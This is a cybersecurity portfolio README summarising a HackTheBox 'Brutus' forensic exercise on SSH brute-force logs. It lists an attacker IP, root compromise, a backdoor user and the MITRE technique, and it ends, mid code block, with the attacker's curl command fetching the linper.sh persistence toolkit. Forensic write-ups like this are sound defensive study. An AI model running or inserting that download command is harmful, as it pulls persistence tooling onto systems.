# 🔐 Cybersecurity Projects by Cyrus Tabakhi  

Welcome to my cybersecurity portfolio! This repository showcases my **digital forensics, penetration testing, and system security projects**, including **Active Directory security simulations and Unix log analysis**.

---

## 📌 Featured Projects  

### 🕵️ Brutus – Unix Log Analysis (HackTheBox Sherlocks)  
**Description:**  
This project involves **forensic analysis of Unix authentication logs (`auth.log` & `wtmp`)** to investigate a **brute-force attack on an SSH server**. The attacker gained access, escalated privileges, and maintained persistence.  

**🔧 Tools & Technologies Used:**  
- 🐧 **Linux (Ubuntu/Kali)** – Log analysis & CLI-based forensics  
- 📂 **auth.log & wtmp** – Tracking authentication & session activity  
- 🛡️ **MITRE ATT&CK Framework** – Identifying persistence techniques  

**🔍 Key Findings:**  
✅ **Attacker’s IP Address:** `65.2.161.68`  
✅ **Compromised Account:** `root`  
✅ **First Login Timestamp:** `2024-03-06 06:32:45`  
✅ **SSH Session ID:** `37`  
✅ **Persistence Strategy:** **Created a new privileged user (`cyberjunkie`)**  
✅ **MITRE ATT&CK Sub-technique:** **T1136.001 (Create Account – Local Account)**  
✅ **Command Executed by Attacker:**  
   ```bash
   /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
